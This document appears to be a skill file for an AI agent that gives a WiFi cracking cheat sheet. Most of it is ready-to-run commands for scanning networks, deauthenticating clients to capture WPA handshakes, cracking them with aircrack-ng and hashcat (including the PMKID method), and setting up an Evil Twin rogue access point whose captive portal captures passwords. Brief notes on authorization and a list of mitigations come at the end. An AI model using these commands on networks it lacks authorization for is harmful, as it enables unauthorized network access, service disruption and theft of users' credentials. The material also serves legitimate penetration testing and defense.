---
name: wifi-cracking
description: WPA/WPA2/WPA3 attacks, Evil Twin, KRACK, PMKID.
---

# WiFi Cracking Techniques

## 1. Reconnaissance

```bash
# Scan for WiFi networks
airodump-ng wlan0mon

# Target specific network
airodump-ng --bssid <AP_MAC> --channel <CH> --write capture wlan0mon

# Find hidden SSIDs
airodump-ng --bssid <AP_MAC> --channel <CH> wlan0mon
# Wait for client connection to reveal SSID
```

## 2. WPA/WPA2 Handshake Capture

```bash
# Capture handshake
aireplay-ng -0 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon
# Deauth client to force reconnection
# Capture 4-way handshake in airodump-ng output

# Verify capture
aircrack-ng capture.cap
```

## 3. WPA/WPA2 Crack

```bash
# Dictionary attack
aircrack-ng -w wordlist.txt capture.cap

# PMKID attack (no client needed)
hcxdumptool -i wlan0mon --enable_status=1 -f capture.pcapng
hcxpcapngtool -o hash.hc22000 capture.pcapng
hashcat -m 22000 hash.hc22000 wordlist.txt

# Rule-based attack
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule
```

## 4. Evil Twin Attack

```bash
# Create fake AP
hostapd /etc/hostapd/evil.conf

# Or using Fluxion
fluxion

# Captive portal for credential capture
# - Create rogue AP with same SSID
# - Redirect to fake login page
# - Capture WPA password or portal credentials
```

## 5. WPA3 Attacks

```bash
# Dragonblood (side-channel)
# downgrade attack to WPA2
# SAE password extraction via timing

# Still requires dictionary attack for WPA3
# But with additional vulnerabilities
```

## 6. OPSEC

- Only test networks you own or have authorization for
- Deauth attacks are illegal in many jurisdictions
- Use isolated testing environment
- Document authorization

## 7. Mitigations

- Use WPA3 (SAE) instead of WPA2
- Strong passphrases (20+ chars)
- Disable WPS
- MAC filtering (weak but adds layer)
- Network segmentation
- Wireless IDS/IPS
